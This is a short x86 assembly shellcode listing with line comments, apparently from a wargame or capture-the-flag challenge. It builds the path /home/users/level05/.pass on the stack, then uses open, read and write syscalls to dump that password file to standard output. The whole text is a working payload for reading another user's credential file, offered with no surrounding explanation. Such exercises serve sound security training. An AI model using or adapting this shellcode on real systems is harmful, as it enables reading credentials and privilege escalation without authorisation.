xor		eax, eax	; Clear eax
push	eax			; push NULL byte
push	0x00000073	; push s
push	0x7361702e	; push .pas
push	0x2f35306c	; push l05/
push	0x6576656c	; push leve
push	0x2f737265	; push ers/
push	0x73752f65	; push e/us
push	0x6d6f682f	; push /hom

mov		ebx, esp		; param1 have address of /home/users/level05/.pass
push	eax				; push NULL byte
xor		ecx, ecx
xor		edx, edx		; param3 mode

mov		al, 5			; syscall open
int		0x80

mov		ebx, eax	; param 1 fd
sub		esp, 0x29	; create 41 char buff
mov		ecx, esp	; param 2 buffer
mov		dl, 0x29	; param 3 size

mov		al, 3		; syscall read
int		0x80

xor		ebx, ebx
mov		bl, 0x1		; param 1 STDOUT

mov		al, 4
int		0x80
